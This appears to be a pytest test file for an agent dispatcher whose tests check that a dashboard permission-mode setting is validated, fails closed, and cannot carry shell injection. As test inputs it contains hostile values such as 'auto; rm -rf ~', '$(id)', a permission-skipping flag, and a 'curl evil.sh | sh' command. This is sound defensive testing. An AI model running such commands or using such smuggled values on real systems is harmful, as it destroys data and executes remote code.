"""The dispatcher's agent permission mode — the first dashboard-WRITABLE setting.

Two properties are load-bearing and every test here exists to pin one of them:

1. **The mode is a closed enum, validated server-side.** It is interpolated into
   the shell command that spawns an agent, and the dashboard is reachable over a
   tailnet — so an unknown value (`--dangerously-skip-permissions`, `auto; rm
   -rf ~`) must be rejected by the API and must never reach a shell. A bad value
   already on disk (hand-edited, corrupt) fails CLOSED to the built-in default
   rather than crashing the PM2-run daemon.
2. **Precedence is WORKFLOW.md's `agent.cmd` → the Settings mode → the built-in
   default** (dispatcher.resolve_agent_cmd), so a workflow that pins a command
   stays authoritative and the drawer can say which source is winning.
"""
from __future__ import annotations

import importlib
import json
import sqlite3
from pathlib import Path
from unittest.mock import patch

import pytest

from chela.sources import Task
from chela.workflow import WorkflowDef


@pytest.fixture()
def mods(tmp_path, monkeypatch):
    """config + userconfig + dispatcher against a temp CHELA_DIR, so nothing here
    reads or writes the real ~/.chela/config.json."""
    monkeypatch.setenv("CHELA_DIR", str(tmp_path / "chela"))
    import chela.config as config
    importlib.reload(config)
    import chela.userconfig as userconfig
    importlib.reload(userconfig)
    import chela.dispatcher as dispatcher
    return config, userconfig, dispatcher


def _wf(**agent) -> WorkflowDef:
    return WorkflowDef(path=Path("/nowhere/WORKFLOW.md"),
                       config={"project_key": "CMX", "agent": agent},
                       prompt_template="")


# --- the enum ---------------------------------------------------------------

def test_modes_are_the_installed_cli_choices(mods):
    """The enum mirrors `claude --help` (--permission-mode choices). Notably there
    is NO "default" mode — omitting the flag is what the CLI's default means."""
    _, _, dispatcher = mods
    assert set(dispatcher.PERMISSION_MODES) == {
        "acceptEdits", "auto", "bypassPermissions", "manual", "dontAsk", "plan",
    }
    assert dispatcher.DEFAULT_PERMISSION_MODE in dispatcher.PERMISSION_MODES


def test_every_mode_is_shell_inert(mods):
    """Enum values get interpolated into a shell command, so no member may carry
    shell syntax. A guard on the enum itself, not on the writer."""
    _, _, dispatcher = mods
    for m in dispatcher.PERMISSION_MODES:
        assert m.isalpha(), m


# --- precedence -------------------------------------------------------------

def test_workflow_cmd_wins(mods):
    _, userconfig, dispatcher = mods
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "plan")
    cmd, src = dispatcher.resolve_agent_cmd(_wf(cmd="claude --permission-mode acceptEdits"))
    assert (cmd, src) == ("claude --permission-mode acceptEdits", "workflow")


def test_settings_mode_used_when_workflow_has_no_cmd(mods):
    _, userconfig, dispatcher = mods
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "plan")
    assert dispatcher.resolve_agent_cmd(_wf()) == (
        "claude --strict-mcp-config --permission-mode plan --model sonnet", "settings")


def test_built_in_default_when_nothing_set(mods):
    _, _, dispatcher = mods
    assert dispatcher.resolve_agent_cmd(_wf()) == (
        "claude --strict-mcp-config --permission-mode auto --model sonnet", "default")


def test_blank_workflow_cmd_falls_through_to_settings(mods):
    """`cmd:` present but empty is not an override — it must not spawn a bare shell."""
    _, userconfig, dispatcher = mods
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "plan")
    assert dispatcher.resolve_agent_cmd(_wf(cmd="   "))[1] == "settings"


# --- CMX-131: dispatched windows never inherit the operator's MCP servers ----
#
# `--strict-mcp-config` with no `--mcp-config` given means the launched CLI loads NO
# MCP servers at all. Without it, a dispatched window inherits the OPERATOR's own
# `~/.claude.json` `mcpServers` (browser automation, docs search, ...), and each
# server's connect handshake races the TUI's own readiness glyph: a late redraw can
# swallow the pasted seed prompt's Enter, leaving the agent idle forever with the
# prompt typed but unsubmitted.

def test_settings_and_default_commands_carry_strict_mcp_config(mods):
    """⚖️ Both the Settings-sourced and the built-in-default command isolate MCP.
    Corrupt (drop `--strict-mcp-config` from AGENT_BASE_CMD) → this goes RED."""
    _, userconfig, dispatcher = mods
    assert "--strict-mcp-config" in dispatcher.resolve_agent_cmd(_wf())[0]
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "plan")
    assert "--strict-mcp-config" in dispatcher.resolve_agent_cmd(_wf())[0]


def test_judge_command_also_carries_strict_mcp_config(mods):
    """⚖️ The judge shares the exact same built-in command, so it isolates MCP too.
    Corrupt (make role="judge" skip the flag) → RED."""
    _, _, dispatcher = mods
    cmd, _ = dispatcher.resolve_agent_cmd(_wf(), "judge")
    assert "--strict-mcp-config" in cmd


def test_workflow_cmd_is_not_forced_to_isolate_mcp(mods):
    """An explicit `agent.cmd` override stays authoritative — no flag is injected
    over it, matching the existing precedence rule (test_workflow_cmd_wins)."""
    _, _, dispatcher = mods
    cmd, src = dispatcher.resolve_agent_cmd(_wf(cmd="claude --permission-mode acceptEdits"))
    assert "--strict-mcp-config" not in cmd
    assert src == "workflow"


# --- the WIRING: the actual spawn commands carry the isolation flag ---------
#
# The pure resolver above proves the LOGIC; this proves the WIRING — that the string
# `_launch_agent` actually sends to tmux via send-keys (for both a first dispatch and
# the judge) is the isolated one, not just what the resolver would return in theory.

def _conn(dispatcher) -> sqlite3.Connection:
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    return dispatcher.ensure_schema(conn)


def _sent_claude_cmd(run_mock) -> str | None:
    for c in run_mock.call_args_list:
        argv = c.args[0] if c.args else c.kwargs.get("args")
        if isinstance(argv, list) and "send-keys" in argv:
            for a in argv:
                if isinstance(a, str) and a.startswith("claude"):
                    return a
    return None


def test_spawn_sends_a_strict_mcp_config_command_to_tmux(mods, tmp_path):
    """🔧 End to end through `_spawn`: the command tmux actually receives isolates MCP.
    Corrupt (revert AGENT_BASE_CMD to plain "claude") → RED."""
    _, _, dispatcher = mods
    wf = _wf()
    task = Task(id="abc123", title="do a thing", file=str(tmp_path / "TODO.md"),
                line_number=7, raw="- [ ] do a thing")
    conn = _conn(dispatcher)
    with patch.object(dispatcher, "ensure_worktree", return_value=(tmp_path / "wt", False)), \
         patch.object(dispatcher.subprocess, "run") as run, \
         patch.object(dispatcher, "_kill_windows_named"), \
         patch.object(dispatcher, "_new_window", return_value="@9"), \
         patch.object(dispatcher, "_wait_for_ready", return_value=True), \
         patch.object(dispatcher, "_send_seed", return_value=True):
        assert dispatcher._spawn(wf, task, attempt=1, conn=conn) is True
    sent = _sent_claude_cmd(run)
    assert sent is not None and "--strict-mcp-config" in sent


def test_spawn_judge_sends_a_strict_mcp_config_command_to_tmux(mods, tmp_path):
    """🔴 End to end through `_spawn_judge`: same isolation, the judge's own launch.
    Corrupt (revert AGENT_BASE_CMD to plain "claude") → RED."""
    _, _, dispatcher = mods
    wf = _wf()
    conn = _conn(dispatcher)
    conn.execute(
        "INSERT INTO runs (task_id, workflow_path, title, status, branch_name, "
        "task_number, pr_url) VALUES (?, ?, ?, 'awaiting_review', ?, ?, ?)",
        ("abc123", str(wf.path), "do a thing", "cmx-1", 1, "https://x/pull/1"),
    )
    conn.commit()
    row = conn.execute("SELECT * FROM runs WHERE task_id=?", ("abc123",)).fetchone()
    wt = tmp_path / "judge-abc123"
    with patch.object(dispatcher, "detached_worktree", return_value=(wt, True)), \
         patch.object(dispatcher.subprocess, "run") as run, \
         patch.object(dispatcher, "_kill_windows_named"), \
         patch.object(dispatcher, "_new_window", return_value="@9"), \
         patch.object(dispatcher, "_wait_for_ready", return_value=True), \
         patch.object(dispatcher, "_send_seed", return_value=True):
        assert dispatcher._spawn_judge(wf, row, "deadbeef", conn) is True
    sent = _sent_claude_cmd(run)
    assert sent is not None and "--strict-mcp-config" in sent


# --- fail closed ------------------------------------------------------------

@pytest.mark.parametrize("bad", [
    "auto; rm -rf ~",
    "--dangerously-skip-permissions",
    "AUTO",
    "bogus",
    "",
    None,
    42,
    ["auto"],
])
def test_bad_stored_mode_fails_closed_to_default(mods, bad):
    """A value outside the enum — however it got on disk — reads as unset, so the
    resolved command is the built-in default. It never reaches the shell."""
    _, userconfig, dispatcher = mods
    userconfig._save({dispatcher.PERMISSION_MODE_KEY: bad})
    assert dispatcher.settings_permission_mode() is None
    assert dispatcher.resolve_agent_cmd(_wf()) == (
        "claude --strict-mcp-config --permission-mode auto --model sonnet", "default")


def test_corrupt_config_file_does_not_crash_the_daemon(mods):
    """The dispatcher runs unattended under PM2; a truncated config.json must
    degrade to the default, not raise out of the tick loop."""
    config, _, dispatcher = mods
    path = config.CHELA_DIR / "config.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{not json", encoding="utf-8")
    assert dispatcher.settings_permission_mode() is None
    assert dispatcher.resolve_agent_cmd(_wf())[1] == "default"


def test_mode_persists_across_a_daemon_restart(mods):
    """Written by the dashboard process, read by a freshly-started dispatcher —
    the store is the file, not in-process state."""
    _, userconfig, dispatcher = mods
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "acceptEdits")
    importlib.reload(userconfig)                      # simulate a restart
    importlib.reload(dispatcher)
    assert dispatcher.settings_permission_mode() == "acceptEdits"
    assert dispatcher.resolve_agent_cmd(_wf())[0] == \
        "claude --strict-mcp-config --permission-mode acceptEdits --model sonnet"


# --- the write path (POST /api/config) --------------------------------------

@pytest.fixture(autouse=True)
def no_live_state(monkeypatch):
    """GET /api/config walks the DISCOVERED workflows to report which ones shadow
    the setting, and discovery queries the runs DB. Cut that off: without this,
    these tests read the machine's LIVE ~/.chela/scheduler.db and real WORKFLOW.md
    files, so they'd pass on an idle machine and wobble whenever chela is actually
    in use (the CMX-33 bug). Tests that want workflows patch these themselves."""
    from chela.dashboard import app as dash
    monkeypatch.setattr(dash.dispatcher, "list_runs", lambda: [])
    monkeypatch.setattr(dash, "_discover_dispatch_workflows", lambda runs: [])


@pytest.fixture()
def client(mods):
    from chela.dashboard import app as dash
    return dash.app.test_client()


def _stored(config) -> dict:
    try:
        return json.loads((config.CHELA_DIR / "config.json").read_text())
    except FileNotFoundError:
        return {}


def test_post_accepts_a_valid_mode(mods, client):
    config, _, dispatcher = mods
    resp = client.post("/api/config", json={"agent_permission_mode": "plan"})
    assert resp.status_code == 200
    assert resp.get_json()["agent_permission_mode_effective"] == "plan"
    assert _stored(config)[dispatcher.PERMISSION_MODE_KEY] == "plan"


@pytest.mark.parametrize("bad", [
    "auto; rm -rf ~",                     # command injection via the mode
    "auto --dangerously-skip-permissions",
    "$(id)",
    "bogus",
    "AUTO",                               # enum is case-sensitive
])
def test_post_rejects_an_unknown_mode_and_keeps_the_current_one(mods, client, bad):
    """Server-side rejection — the UI's <select> is a convenience, not the gate."""
    config, userconfig, dispatcher = mods
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "plan")
    resp = client.post("/api/config", json={"agent_permission_mode": bad})
    assert resp.status_code == 400
    assert resp.get_json()["valid"] == list(dispatcher.PERMISSION_MODES)
    # Fail closed: the rejected value is not stored and the old mode survives.
    assert _stored(config)[dispatcher.PERMISSION_MODE_KEY] == "plan"
    assert dispatcher.settings_permission_mode() == "plan"


def test_post_empty_clears_back_to_the_built_in_default(mods, client):
    config, userconfig, dispatcher = mods
    userconfig.set_(dispatcher.PERMISSION_MODE_KEY, "plan")
    resp = client.post("/api/config", json={"agent_permission_mode": ""})
    assert resp.status_code == 200
    body = resp.get_json()
    assert body["agent_permission_mode"] == ""
    assert body["agent_permission_mode_effective"] == dispatcher.DEFAULT_PERMISSION_MODE
    assert dispatcher.PERMISSION_MODE_KEY not in _stored(config)


def test_there_is_no_endpoint_to_set_the_command_itself(mods, client):
    """The RCE guard: agent.cmd is NOT writable over HTTP — only the mode enum is.
    An agent_cmd key in the body must be ignored, not persisted."""
    config, _, _ = mods
    resp = client.post("/api/config", json={"agent_cmd": "sh -c 'curl evil.sh | sh'"})
    assert resp.status_code == 200
    assert "agent_cmd" not in _stored(config)
    assert "agent_cmd" not in resp.get_json()


def test_get_reports_the_enum_and_the_winning_source(mods, client):
    _, _, dispatcher = mods
    body = client.get("/api/config").get_json()
    assert body["agent_permission_modes"] == list(dispatcher.PERMISSION_MODES)
    assert body["agent_permission_mode"] == ""            # unset
    assert body["agent_permission_mode_effective"] == dispatcher.DEFAULT_PERMISSION_MODE
    assert body["agent_cmd_overrides"] == []


def test_get_surfaces_a_workflow_that_shadows_the_setting(mods, client, tmp_path, monkeypatch):
    """A WORKFLOW.md pinning agent.cmd outranks Settings — the drawer must be able
    to say so instead of implying the mode always applies."""
    from chela.dashboard import app as dash
    wf = tmp_path / "WORKFLOW.md"
    wf.write_text(
        "---\nproject_key: CMX\ntracker:\n  kind: markdown\n  path: TODO.md\n"
        "agent:\n  cmd: claude --permission-mode bypassPermissions\n---\n\nprompt\n",
        encoding="utf-8",
    )
    monkeypatch.setattr(dash, "_discover_dispatch_workflows", lambda runs: [wf])
    overrides = client.get("/api/config").get_json()["agent_cmd_overrides"]
    assert overrides == [{"workflow": "WORKFLOW.md", "path": str(wf),
                          "cmd": "claude --permission-mode bypassPermissions"}]
